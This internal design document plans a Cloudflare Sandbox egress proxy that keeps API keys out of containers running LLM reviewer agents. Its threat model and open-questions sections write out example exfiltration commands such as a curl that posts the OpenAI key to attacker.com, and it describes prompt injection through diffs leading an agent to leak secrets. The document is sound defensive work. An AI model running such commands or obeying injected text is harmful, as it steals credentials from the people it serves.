# Cloudflare Sandbox egress-proxy pattern (`outboundByHost`)

**Status:** Plan / not yet implementation. Pairs with `cli-subscription-credential-plumbing.md` (where this is "Fallback B / Pattern D") and `multi-agent-pre-push-review.md` (where this is the credential path used when subscription bootstrap can't complete).
**Scope:** Documents the Cloudflare Sandbox SDK `outboundByHost` primitive as a reusable security pattern: API keys never enter the container, all egress is policy-controlled, the Sandbox is defense-in-depth even if the agent inside is compromised. The primary credential path for our pre-push reviewers is subscription auth in per-(user, repo) Sandboxes — this primitive is the **fallback** for when that path can't run.
**Audience:** Engineers implementing any cloud-Sandbox-based reviewer or agent that needs API credentials; security reviewers evaluating sandbox blast radius; anyone who needs to run a Sandbox-hosted agent against a service-account-style API key (rather than per-user subscription auth).

---

## TL;DR

The Cloudflare Sandbox SDK lets the parent Worker intercept the Sandbox's outbound HTTP/HTTPS traffic per-host and rewrite requests before they leave Cloudflare's network. Combined with `enableInternet = false` and `interceptHttps = true`, this gives a substrate where:

- The container has **no direct internet access**
- API requests from the container hit `http://api.openai.com/v1` (or similar)
- The Worker's `outboundByHost` handler intercepts them, injects `Authorization: Bearer ${KEY}`, upgrades to HTTPS, and forwards
- A catch-all `outbound` handler 403s anything not on the allowlist
- **The API key is a Wrangler secret in the Worker; it never enters the container**

This is dramatically better than the naive pattern (key as env var inside the Sandbox) for blast radius. If the agent inside the Sandbox is exploited via prompt injection, supply-chain compromise, or model jailbreak, the worst it can do is make API requests through the proxy — it cannot exfiltrate the key, cannot reach unrelated hosts, cannot pivot.

**This is the right pattern wherever Sandboxes hold API keys.** For Interlinked specifically, the primary reviewer path is subscription auth (`CLAUDE_CODE_OAUTH_TOKEN` for Claude, in-Sandbox `codex login --device-auth` for Codex) — see `cli-subscription-credential-plumbing.md`. Egress proxy comes into play for the **fallback paths**: users whose environments can't complete the interactive Codex bootstrap, or future use cases like managed-service tiers where Interlinked runs reviews against org-level API keys instead of per-developer subscriptions.

---

## 1. Why this matters

The straightforward way to give a CLI inside a Cloudflare Sandbox access to OpenAI / Anthropic / etc. is to set the API key as an env var:

```typescript
await sandbox.setEnvVars({ OPENAI_API_KEY: env.OPENAI_API_KEY });
```

This is what Cloudflare's [`examples/claude-code`](https://github.com/cloudflare/sandbox-sdk/tree/main/examples/claude-code) does. It's simple and works. It also means the API key is readable by anything inside the container — by `cat $ENV`, by `printenv`, by any command the agent decides to run. If the agent gets prompt-injected to run `curl attacker.com -d "$OPENAI_API_KEY"`, the key is gone.

For our pre-push reviewer use case, the agent *is* a coding LLM running against arbitrary diff content that might contain adversarial input. Prompt injection is a real concern. Even if we trust the diff content, the reviewer also reads `AGENTS.md`, repo files, etc. — any of which could be injection vectors. We want defense in depth.

**The egress-proxy pattern moves the key out of the container entirely.** The container only knows about an HTTP base URL. The key lives in the Worker's secret store and is injected by the Worker on the way out.

## 2. The mechanism

From the [`examples/codex-app-server`](https://github.com/cloudflare/sandbox-sdk/tree/main/examples/codex-app-server) README and source:

```typescript
import { Sandbox as BaseSandbox } from '@cloudflare/sandbox';

export class Sandbox extends BaseSandbox<Env> {
  enableInternet = false;   // block direct internet at the network level
  interceptHttps = true;    // intercept HTTPS via Cloudflare CA cert injection
}

Sandbox.outboundByHost = {
  'api.openai.com': async (request: Request, env: Env) => {
    const url = new URL(request.url);
    const headers = new Headers(request.headers);
    headers.set('Authorization', `Bearer ${env.OPENAI_API_KEY}`);
    headers.delete('X-Api-Key');
    return fetch(`https://api.openai.com${url.pathname}${url.search}`, {
      method: request.method,
      headers,
      body: request.body
    });
  },
  'github.com': async (request: Request) => {
    // pass-through with no key injection (public repos)
    const url = new URL(request.url);
    return fetch(`https://github.com${url.pathname}${url.search}`, {
      method: request.method,
      headers: request.headers,
      body: request.body
    });
  }
};

Sandbox.outbound = async (request: Request) => {
  // catch-all: deny anything not explicitly allowed
  console.log(`[egress] Blocked: ${request.method} ${request.url}`);
  return new Response('Forbidden by egress policy', { status: 403 });
};
```

Inside the container, the `OPENAI_BASE_URL` env var is set to `http://api.openai.com/v1` (note: HTTP, not HTTPS — the proxy upgrades it). The Codex CLI does its normal thing, hitting `api.openai.com/v1/chat/completions` like any HTTP client. The Worker intercepts, injects the key, upgrades to TLS, forwards. Response streams back through the same path.

Three things make this work:

1. **`enableInternet = false`** — the Sandbox container is on a virtual network with no default route to the public internet. The only way out is through the Worker's egress handlers.
2. **`interceptHttps = true`** — Cloudflare injects a CA certificate into the container so that HTTPS traffic also flows through the egress handlers (otherwise HTTPS would bypass them entirely via raw TCP).
3. **`outboundByHost` + `outbound`** — per-host policies with a deny-by-default catch-all. The pattern works because anything not explicitly handled is 403'd.

## 3. Threat model

This pattern defends against:

| Threat | Without egress proxy | With egress proxy |
|---|---|---|
| Prompt injection makes the agent run `curl attacker.com -d "$OPENAI_API_KEY"` | Key exfiltrated | `Forbidden by egress policy` (attacker.com not on allowlist) |
| Compromised npm dependency reads `process.env.OPENAI_API_KEY` and uploads it | Key exfiltrated | Key isn't in the container env at all; only base URL is |
| Agent persists key to disk via `cat $OPENAI_API_KEY > /tmp/key` | Key persisted in container FS, exfiltratable on next allowed request | Same — but agent can only call allowed hosts, so exfiltration channel is narrower |
| Sandbox network namespace exploit (kernel CVE) bypasses the network policy | Key reachable via direct TCP to api.openai.com | Key still not in the container; attacker would need to compromise the parent Worker too |

It does NOT defend against:

- The agent making *legitimate-looking* requests to allowed hosts using the injected key. The proxy can't tell "agent reviewing code" from "agent burning credits." Rate-limiting and budget caps on the API key side are the right control here.
- The agent reading sensitive content from the diff and including it in API requests (e.g., to OpenAI). The proxy doesn't inspect request bodies for sensitive content; that's a different layer (DLP / content filtering on the egress handler).
- A malicious parent Worker. If the Worker itself is compromised, the key is gone. The trust boundary is Worker, not Sandbox.

## 4. When to use it

Use the egress-proxy pattern whenever:

- A Sandbox needs an API key for an external service
- The Sandbox runs untrusted or partially-trusted code (LLM agents reading user-controlled input qualifies)
- The blast radius of a key leak is meaningful (paid API access, billable, or with elevated permissions)

Don't bother with it when:

- The Sandbox is a trusted environment running known-good code (e.g., your own deterministic build pipeline)
- The "credential" is genuinely public (e.g., a public CDN URL, a public package registry)
- The setup overhead exceeds the security benefit (e.g., for a one-off prototype)

For our pre-push reviewer system, the **primary path is subscription auth** (per-developer `CLAUDE_CODE_OAUTH_TOKEN` and per-(user, repo) Sandbox-resident Codex auth.json from interactive `codex login`). Egress proxy doesn't apply to those paths — the credentials are user-scoped, distributed by design, and the CLIs manage them internally. Per-developer Sandboxes also have a much smaller blast radius than a service-account API key, since each user's credentials are scoped to that user only.

**Where egress proxy IS the right pattern for Interlinked:**

- **Fallback B (API-key Codex in cloud Sandbox):** when a user can't complete the interactive bootstrap login flow — workspace admin gating + no preview-URL access. They opt into API-key billing; egress proxy injects `OPENAI_API_KEY` server-side and the user's credentials never enter the container. Per `cli-subscription-credential-plumbing.md` §7 Fallback B.
- **Workers AI / GPT-OSS classifier calls from a Worker:** the harness's PreToolUse classifier calls inference through AI Gateway. Same `cf-aig-authorization` injection pattern at the Worker→AI Gateway boundary; this is what CF's iMARS proxy Worker does. Per `project_classifier_inference.md` (memory) — v2 goal is server-provided inference for all users.
- **Future managed-service tier:** if Interlinked ever runs reviews on behalf of customers without per-developer subscriptions (e.g., a hosted SaaS tier billing API rates), the org-level API keys flow through this exact pattern. Not in v1; defer.
- **OpenCode CLI in Sandbox (if added to the cohort later):** OpenCode is open-source, multi-model, and runs against API keys (no equivalent of `claude setup-token` exists for it). If we add it to the reviewer cohort, this is its credential path.

**Don't use egress proxy for:**

- The primary subscription-auth reviewer paths (Claude with `CLAUDE_CODE_OAUTH_TOKEN`, Codex with in-Sandbox login). Those credentials are user-scoped and distributed by design; egress proxy adds nothing.
- The Sandbox-internal auth flow during Codex `codex login --device-auth`. That flow needs `chatgpt.com` and `auth.openai.com` reachable from inside the container so the OAuth callback can complete. Adding those hosts to the per-host allowlist with pass-through (no key injection) is fine.

## 5. Per-host allowlist as policy

The `outboundByHost` map is effectively the egress policy. For a code reviewer Sandbox, a reasonable starting allowlist:

| Host | Purpose | Header rewrite |
|---|---|---|
| `api.openai.com` | OpenAI API for Codex | `Authorization: Bearer $OPENAI_API_KEY` |
| `api.anthropic.com` | Anthropic API for Claude (when using API key, not subscription token) | `x-api-key: $ANTHROPIC_API_KEY` |
| `gateway.ai.cloudflare.com` | AI Gateway (proxied inference) | `cf-aig-authorization: Bearer $AIG_TOKEN` |
| `github.com` / `api.github.com` / `raw.githubusercontent.com` | Repo cloning, public refs | Pass-through |
| `registry.npmjs.org` / `pkg.cloudflare.com` | Package install during reviewer setup | Pass-through |
| (catch-all) | Anything else | 403 |

This is restrictive by design. If a reviewer needs to fetch from a new host, that's an explicit policy change reviewable by the team admin — not silent.

## 6. Operational concerns

**Adding a host:** the egress policy is in code, not config. Adding a new allowed host means a Worker deploy. This is intentional — egress policy is security-relevant, deserves code review and audit trail.

**Logging:** log every blocked request. A spike in blocked requests from a Sandbox is a signal that something is wrong — either the agent is misbehaving, or the allowlist is too tight.

**Performance:** the proxy adds a small latency (Worker → external service round trip is one more hop than direct from container, but in practice both are at the Cloudflare edge so the cost is negligible). Not a concern.

**Streaming:** for SSE / streaming model responses (`text/event-stream`), the egress handler must pass `body` through without buffering. The CF example does this correctly with `body: request.body`.

**Request size limits:** Worker request body limits apply (typically generous). For very large diffs being sent through, consider chunking or attaching to an Artifact.

## 7. The proxy-Worker pattern outside Sandboxes

This same conceptual pattern (the Worker as the credential boundary) appears in Cloudflare's internal AI engineering stack at a different layer — see [iMARS post](https://blog.cloudflare.com/internal-ai-engineering-stack/). Their setup:

- All AI inference calls go through a proxy Worker
- The Worker injects `cf-aig-authorization: Bearer $API_KEY` server-side
- AI Gateway routes to the actual provider
- "No API keys exist on user machines"

Our Sandbox `outboundByHost` is the same shape, just at the Sandbox-to-internet boundary instead of the user-to-AI-Gateway boundary. Conceptually, **anywhere you have untrusted-or-semi-trusted code that needs credentials, the right move is to make a Worker the credential boundary**, with the credential as a server-side secret and the untrusted code seeing only an unauthenticated base URL.

The pattern composes: a user's CLI hits the team's discovery-endpoint Worker (no creds on the dev machine), which dispatches into a Sandbox (no creds in the container), which makes API calls through `outboundByHost` (key injected at egress). Three layers, three trust boundaries, one credential surface managed centrally.

## 8. Implementation surface for Interlinked

The egress-proxy primitive shows up in two distinct places in our cloud architecture, both bundled into `multi-agent-pre-push-review.md`'s cloud blueprint:

**(a) Primary reviewer Sandbox — pass-through allowlist.** The per-(user, repo) Sandbox running both reviewers on subscription auth still benefits from `outboundByHost` for two reasons: defense-in-depth on the network layer, and explicit allowlisting of the hosts the bootstrap flows need to reach.

1. **Sandbox subclass** — `enableInternet = false`, `interceptHttps = true`, `outboundByHost` allowlist with **pass-through entries** (no key injection) for: `api.anthropic.com` (Claude's outbound during review), `chatgpt.com` and `auth.openai.com` (Codex device-auth flow), `api.openai.com` (Codex's outbound during review using its in-Sandbox auth.json), `github.com` / `api.github.com` / `raw.githubusercontent.com` (repo cloning), `registry.npmjs.org` (package install)
2. **Catch-all `outbound`** — 403 on anything not on the allowlist
3. **`CLAUDE_CODE_OAUTH_TOKEN`** — injected as Sandbox env var (Wrangler secret per-user; not via egress proxy because the token is user-scoped and the Anthropic CLI manages its own auth flow)
4. **Codex auth.json** — written by `codex login` running inside the Sandbox during bootstrap; never transits via the proxy

**(b) Fallback B reviewer Sandbox — key-injection variant.** For users who can't complete the interactive Codex bootstrap, a separate Sandbox class uses egress proxy with key injection:

1. **Worker config** — `[[secrets]]` for `OPENAI_API_KEY`
2. **Sandbox env** — `OPENAI_BASE_URL=http://api.openai.com/v1` (note HTTP — the proxy upgrades to HTTPS)
3. **`outboundByHost`** — `api.openai.com` handler injects `Authorization: Bearer ${OPENAI_API_KEY}`, upgrades to HTTPS, forwards
4. Same catch-all 403 as (a)

**Shared concerns across both:**

- **Logging** — egress events to Logpush for observability; blocked requests get extra detail (full URL, originating CLI process)
- **Per-tenant allowlist customization** — a future enhancement: team admins can add hosts via config without a Worker redeploy. Until that's needed, defer.

The classifier-side proxy Worker (per `project_classifier_inference.md` memory and the iMARS pattern) is a separate Worker entirely — it's the user→AI-Gateway boundary, not the Sandbox→internet boundary. Same pattern, different layer.

## 9. What this is NOT

- **Not a replacement for API-key rotation.** Even with egress proxy, keys should rotate on a schedule. The proxy reduces blast radius; rotation reduces blast duration.
- **Not a replacement for sensible API-side rate limits.** A compromised agent making "legitimate" requests through the allowlisted host can still burn budget. Rate limits and per-key spending caps are essential.
- **Not a "your code is now safe to run any LLM agent in" stamp.** It's one layer. The rest of the harness (taint tracking, prompt-injection scanning, output classification) still applies.
- **Not unique to Codex.** The `examples/codex-app-server` is just where CF first demonstrated it cleanly. The pattern applies to any Sandbox-hosted agent with API credentials.

## 10. Open questions

- **Should the proxy do request-body inspection for credential leakage?** Right now `outboundByHost` lets the request body through unchanged. If the agent decides to include the API key in a request body (`curl api.openai.com -d "key=$OPENAI_API_KEY"`), the proxy would forward it. Would need to scan request bodies for known-secret patterns. Probably worth doing as a defense-in-depth measure; needs implementation.
- **What about non-HTTP protocols?** The egress proxy works for HTTP/HTTPS. If an agent tries to use raw TCP to a non-allowed host, the network namespace `enableInternet = false` blocks it at the network layer. But what about DNS exfiltration? Probably deferred; DNS goes through Cloudflare resolvers and could be blocked or logged, but isn't today.
- **Per-Sandbox vs per-user egress policy.** Currently the policy is per-Sandbox-class. If we want per-tenant allowlists (team A allows different hosts than team B), the policy needs to be parameterized at runtime, not hardcoded. The pattern supports this — the handler closes over `env`, which can include tenant config — but isn't built yet.

---

## Sources

Primary:

- [Cloudflare Sandbox SDK examples — codex-app-server](https://github.com/cloudflare/sandbox-sdk/tree/main/examples/codex-app-server) — first-party demonstration of the `outboundByHost` pattern with Codex; the README and `src/index.ts` are the reference implementation
- [Cloudflare Sandbox SDK overview](https://developers.cloudflare.com/sandbox/) — base API for Sandboxes, `enableInternet`, `interceptHttps`, etc.
- [Cloudflare Sandbox SDK examples — claude-code](https://github.com/cloudflare/sandbox-sdk/tree/main/examples/claude-code) — by contrast, uses the simpler "key as env var" pattern; demonstrates both API-key (`/`) and subscription-token (`/sub`) routes

Conceptual cousins:

- [Cloudflare Internal AI Engineering Stack (iMARS post)](https://blog.cloudflare.com/internal-ai-engineering-stack/) — same proxy-Worker-as-credential-boundary pattern, applied at the user-to-AI-Gateway boundary instead of the Sandbox-to-internet boundary
- [Cloudflare AI Gateway docs](https://developers.cloudflare.com/ai-gateway/) — the upstream system the iMARS pattern proxies to; supports `cf-aig-authorization` header injection

Cross-reference docs in this repo:

- [`cli-subscription-credential-plumbing.md`](./cli-subscription-credential-plumbing.md) — this is "Pattern D" in that doc's pattern table
- [`multi-agent-pre-push-review.md`](./multi-agent-pre-push-review.md) — uses this pattern for any API-key reviewer
- [`three-product-architecture.md`](./three-product-architecture.md) — Agent CI tier where Sandboxes live
